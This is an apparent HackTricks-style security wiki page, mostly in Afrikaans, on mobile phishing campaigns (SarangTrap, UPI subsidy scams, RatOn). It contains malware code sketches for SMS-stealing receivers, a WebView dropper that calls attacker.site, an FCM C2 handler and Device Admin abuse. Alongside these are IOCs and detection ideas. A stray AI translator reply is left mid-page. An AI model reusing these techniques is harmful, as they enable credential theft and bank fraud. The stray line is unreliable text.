# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakteurs gebruik word om **malicious Android APKs** en **iOS mobile-configuration profiles** deur phishing (SEO, sosiale ingenieurswese, vals winkels, dating apps, ens.) te versprei.
> Die materiaal is aangepas vanaf die SarangTrap veldtog wat deur Zimperium zLabs (2025) ontbloot is en ander publieke navorsing.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registreer dosyne van look-alike domeine (dating, cloud share, car service…).
– Gebruik sleutelwoorde in die plaaslike taal en emoji's in die `<title>` element om in Google te rangskik.
– Host *both* Android (`.apk`) en iOS install instructions op dieselfde landing page.
2. **First Stage Download**
* Android: direkte skakel na 'n *unsigned* of “third-party store” APK.
* iOS: `itms-services://` of gewone HTTPS-skakel na 'n kwaadwillige **mobileconfig** profile (sien hieronder).
3. **Post-install Social Engineering**
* By die eerste keer laat die app 'n **invitation / verification code** verskyn (illusie van eksklusiewe toegang).
* Die kode word **POSTed over HTTP** na die Command-and-Control (C2).
* C2 antwoord `{"success":true}` ➜ malware gaan voort.
* Sandbox / AV dinamiese analise wat nooit 'n geldige kode stuur nie sien **geen kwaadwillige gedrag** nie (evasion).
4. **Runtime Permission Abuse** (Android)
* Gevaarlike toestemmings word slegs aangevra **na 'n positiewe C2-antwoord**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Onlangse variante **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin-kodepad wat SMS deur reflection lees staan ⇒ verlaag statiese telling terwyl dit steeds funksioneel is op toestelle wat die toestemming via `AppOps` misbruik of ou teikens verleen.
5. **Facade UI & Background Collection**
* Die app wys onskuldige skerms (SMS viewer, gallery picker) wat lokaal geïmplementeer is.
* Intussen exfiltreer dit:
- IMEI / IMSI, telefoonnommer
- Volledige `ContactsContract` dump (JSON array)
- JPEG/PNG van `/sdcard/DCIM` gekompresseer met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Opsionele SMS-inhoud (`content://sms`)
Payloads word **batch-zipped** en gestuur via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* 'n Enkel **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. versoek om die toestel in 'n “MDM”-agtige toesig te registreer.
* Sosiale-ingenieurswese instruksies:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* drie keer (skermskote op die phishing-blad).
3. Trust die unsigned profile ➜ aanvaller kry *Contacts* & *Photo* entitlements sonder App Store review.
7. **Network Layer**
* Plain HTTP, gereeld op poort 80 met HOST header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om op te spoor).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Tydens malware-assessering, automatiseer die invitation code fase met Frida/Objection om die kwaadwillige tak te bereik.
* **Manifest vs. Runtime Diff** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; ontbrekende gevaarlike perms is 'n rooi vlag.
* **Network Canary** – Stel `iptables -p tcp --dport 80 -j NFQUEUE` op om ongewone POST-burst na kode-invoer te detect.
* **mobileconfig Inspection** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en oormaat entitlements uit te spoor.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** om skielike uitbarstings van sleutelwoord-ryke domeine raak te sien.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` van Dalvik kliënte buite Google Play.
* **Invite-code Telemetry** – POST van 6–8 syfer numeriese kodes kort nadat 'n APK geïnstalleer is kan staging aandui.
* **MobileConfig Signing** – Blokkeer unsigned configuration profiles via MDM policy.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Aanwysers (Algemeen)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Betaal-phishing (UPI) – Dropper + FCM C2-patroon

Hierdie patroon is waargeneem in veldtogte wat regeringsvoordeel-temas misbruik om Indiese UPI-inlogbesonderhede en OTP's te steel. Operateurs gebruik 'n ketting van betroubare platforms vir aflewering en veerkragtigheid.

### Afleweringsketting oor vertroude platforms
- YouTube video lokmiddel → beskrywing bevat 'n kort skakel
- Kortskakel → GitHub Pages phishing-werf wat die legit portaal naboots
- Dieselfde GitHub repo huisves 'n APK met 'n vals “Google Play” kenteken wat direk na die lêer skakel
- Dinamiese phishing-bladsye leef op Replit; afgeleë opdragkanaal gebruik Firebase Cloud Messaging (FCM)

### Dropper met embedded payload en offline installasie
- Eerste APK is 'n installateur (dropper) wat die werklike malware by `assets/app.apk` lewer en die gebruiker aanmoedig om Wi‑Fi/mobiele data af te skakel om wolkopsporing te versag.
- Die embedded payload installeer onder 'n onskuldige etiket (bv., “Secure Update”). Na installasie is beide die installateur en die payload teenwoordig as aparte apps.

Statiese triage wenk (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamiese eindpunt-ontdekking via shortlink
- Malware haal 'n platte teks, komma-geskeide lys van aktiewe eindpunte van 'n shortlink; eenvoudige string-transformasies lewer die finale phishing-bladsypad.

Voorbeeld (gesanitiseer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Die “Make payment of ₹1 / UPI‑Lite” stap laai 'n aanvaller se HTML-vorm vanaf die dinamiese endpunt binne 'n WebView en vang sensitiewe velde (telefoon, bank, UPI PIN) wat per `POST` na `addup.php` gestuur word.

Minimale laaier:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-voortplanting en SMS/OTP onderskepping
- Agressiewe toestemmings word by die eerste uitvoering aangevra:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte word herhaaldelik gebruik om massaal smishing SMS vanaf die slagoffer se toestel te stuur.
- Inkomende SMS word deur 'n broadcast receiver onderskep en saam met metadata (afsender, inhoud, SIM-slot, per-toestel ewekansige ID) na `/addsm.php` opgelaai.

Ontvanger-skets:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as veerkragtige C2
- Die payload registreer by FCM; push-boodskappe dra 'n `_type`-veld wat as 'n skakelaar gebruik word om aksies te aktiveer (bv. werk phishing-tekst-sjablone by, skakel gedrag aan/af).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Jagpatrone en IOCs
- APK bevat sekondêre payload by `assets/app.apk`
- WebView laai betaling vanaf `gate.htm` en exfiltrates na `/addup.php`
- SMS exfiltration na `/addsm.php`
- Shortlink-gedrewe config fetch (bv. `rebrand.ly/*`) wat CSV endpoints teruggee
- Apps gemerk as generiese “Update/Secure Update”
- FCM `data` messages met 'n `_type` discriminator in onbetroubare apps

### Opsporing & verdedigingsidees
- Merk apps wat gebruikers instrueer om die netwerk te deaktiveer tydens installasie en dan 'n tweede APK vanaf `assets/` side-load.
- Waarsku op die permisietuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-gebaseerde betalingstrome.
- Monitering van uitgaande verkeer vir `POST /addup.php|/addsm.php` op nie-korporatiewe hosts; blokkeer bekende infrastruktuur.
- Mobile EDR-reëls: onbetroubare app wat vir FCM registreer en vertak op 'n `_type` veld.

---

## Socket.IO/WebSocket-gebaseerde APK Smuggling + Valse Google Play-bladsye

Aanvallers vervang toenemend statiese APK-skakels met 'n Socket.IO/WebSocket-kanaal wat in Google Play-agtige lokvalle ingesluit is. Dit verberg die payload URL, omseil URL/extension filters, en behou 'n realistiese install UX.

Tipiese kliëntvloei wat in die veld waargeneem is:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Waarom dit eenvoudige kontroles ontduik:
- Geen statiese APK URL word blootgestel nie; die payload word in geheue herkonstruer uit WebSocket frames.
- URL/MIME/extension filters wat direkte .apk-antwoorde blokkeer, kan binêre data wat via WebSockets/Socket.IO getunnel is, mis.
- Crawlers en URL sandboxes wat nie WebSockets uitvoer nie, sal nie die payload haal nie.

Hunting and detection ideas:
- Web/network telemetry: merk WebSocket-sessies wat groot binêre stukke oordra gevolg deur die skep van 'n Blob met MIME application/vnd.android.package-archive en 'n programmatiese `<a download>`-klik. Soek na kliëntstringe soos socket.emit('startDownload'), en na events met name chunk, downloadProgress, downloadComplete in bladsy-skripte.
- Play-store spoof heuristics: op nie-Google domeine wat Play-agtige bladsye bedien, soek na Google Play UI-strings soos http.html:"VfPpkd-jY41G-V67aGc", gemengde-taal sjablone, en vals “verification/progress” vloei aangedryf deur WS events.
- Controls: blokkeer APK-aflewering van nie-Google oorspronge; handhaaf MIME/extension-beleid wat WebSocket-verkeer insluit; bewaar blaaier se veilige-aflaai-aanwysings.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn gevallestudie

Die RatOn banker/RAT-veldtog (ThreatFabric) is 'n konkrete voorbeeld van hoe moderne mobiele phishing-operasies WebView droppers, Accessibility-gedrewe UI-automatisering, overlays/ransom, Device Admin-dwang, Automated Transfer System (ATS), oorname van crypto-wallets, en selfs NFC-relay-orkestrering meng. Hierdie afdeling abstraheer die herbruikbare tegnieke.

### Stage-1: WebView → native install bridge (dropper)
Aanvallers wys 'n WebView wat na 'n aanvallersbladsy wys en injecteer 'n JavaScript interface wat 'n native installer blootstel. 'n Tik op 'n HTML-knoppie roep native kode aan wat 'n tweede-fase APK installeer wat in die dropper's assets gebundel is en dit dan direk lanseer.

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
I don't have the page content. Please paste the HTML or the contents of src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md that you want translated to Afrikaans.
```html
<button onclick="bridge.installApk()">Install</button>
```
Na die installasie begin die dropper die payload deur 'n eksplisiete package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Opsporingsidee: onbetroubare apps wat `addJavascriptInterface()` aanroep en installer-agtige metodes aan WebView blootstel; APK wat 'n ingeslote sekondêre payload onder `assets/` lewer en die Package Installer Session API aanroep.

### Toestemmingstrechter: Accessibility + Device Admin + opvolg-runtime-promptse
Fase-2 open 'n WebView wat 'n “Access”-bladsy aanbied. Die knoppie roep 'n geënvolgde metode aan wat die slagoffer na die Accessibility-instellings navigeer en versoek om die skelm diens te aktiveer. Sodra dit toegestaan is, gebruik die malware Accessibility om outomaties deur daaropvolgende runtime-magtigingsdialoë te klik (kontakte, overlay, bestuur stelselinstellings, ens.) en versoek Device Admin.

- Accessibility help programmaties om later prompts te aanvaar deur knoppies soos “Allow”/“OK” in die knoopboom te vind en kliekgebeurtenisse te stuur.
- Overlay magtiging kontrole/versoek:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Sien ook:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operateurs kan opdragte uitreik om:
- vertoon 'n volskerm-overlay vanaf 'n URL, of
- stuur inline HTML wat in 'n WebView-overlay gelaai word.

Waarskynlike gebruike: dwang (PIN-invoer), wallet-opening om PINne vas te vang, losprysboodskappe. Hou 'n opdrag by om te verseker dat overlay-permissie toegewys is indien dit ontbreek.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodies die Accessibility node-boom uitgooi, serialiseer sigbare tekste/rolle/grense en stuur na C2 as 'n pseudo-skerm (opdragte soos `txt_screen` eenmalig en `screen_live` kontinu).
- High-fidelity: versoek MediaProjection en begin screen-casting/opname op aanvraag (opdragte soos `display` / `record`).

### ATS playbook (bank app automation)
Gegewe 'n JSON-taak, open die bank app, bestuur die UI via Accessibility met 'n mengsel van teksnavrae en koördinaat-tappe, en voer die slagoffer se betalings-PIN in wanneer gevra.

Voorbeeldtaak:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuwe betaling"
- "Zadat platbu" → "Voer betaling in"
- "Nový příjemce" → "Nuwe ontvanger"
- "Domácí číslo účtu" → "Inlandse rekeningnommer"
- "Další" → "Volgende"
- "Odeslat" → "Stuur"
- "Ano, pokračovat" → "Ja, gaan voort"
- "Zaplatit" → "Betaal"
- "Hotovo" → "Klaar"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Uittrekking van herstelfras van crypto-beursies
Teikens soos MetaMask, Trust Wallet, Blockchain.com, Phantom. Proses: ontsluit (gesteelde PIN of verskafde wagwoord), navigeer na Security/Recovery, onthul/wys die herstelfras, keylog/exfiltrate dit. Implementeer locale-aware selectors (EN/RU/CZ/SK) om navigasie oor tale te stabiliseer.

### Device Admin-afdwinging
Device Admin APIs word gebruik om geleenthede om die PIN vas te vang te verhoog en die slagoffer te frustreer:

- Onmiddellike vergrendeling:
```java
dpm.lockNow();
```
- Laat die huidige credential verval om verandering af te dwing (Accessibility vang nuwe PIN/password op):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Dwing nie-biometriese ontgrendeling af deur keyguard se biometriese funksies uit te skakel:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Baie DevicePolicyManager-beheer vereis Device Owner/Profile Owner op onlangse Android; sommige OEM-boues kan los wees. Valideer dit altyd op die teiken OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 kan 'n eksterne NFC-relay-module installeer en start (bv. NFSkate) en selfs 'n HTML-sjabloon aanstuur om die slagoffer tydens die relay te lei. Dit maak kontaklose (card-present) cash-out langsaan aanlyn ATS moontlik.

Background: https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay

### Operator command set (sample)
- UI/toestand: `txt_screen`, `screen_live`, `display`, `record`
- Sosiaal: `send_push`, `Facebook`, `WhatsApp`
- Oorlae: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Toestel: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikasie/Verkenning: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Opsporing & verdediging-idees (RatOn-styl)
- Soek na WebViews met `addJavascriptInterface()` wat installer-/permission-metodes blootstel; bladsye wat eindig op “/access” wat Accessibility-prompts aktiveer.
- Waarsku op apps wat 'n hoë tempo Accessibility-gebare/klikke genereer kort nadat diens-toegang gegee is; telemetrie wat lyk soos Accessibility node dumps na C2 gestuur word.
- Monitor Device Admin-beleidveranderings in onbetroubare apps: `lockNow`, password expiration, keyguard feature toggles.
- Waarsku op MediaProjection-prompts van nie-korporatiewe apps gevolg deur periodieke frame-oplaaie.
- Detecteer die installasie of start van 'n eksterne NFC-relay-app wat deur 'n ander app geaktiveer is.
- Vir bankdienste: handhaaf out-of-band-bevestigings, biometrie-binding, en transaksie-limiete wat weerstand bied teen op-toestel-automatisering.

## Verwysings

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android beeldkompressie-biblioteek](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
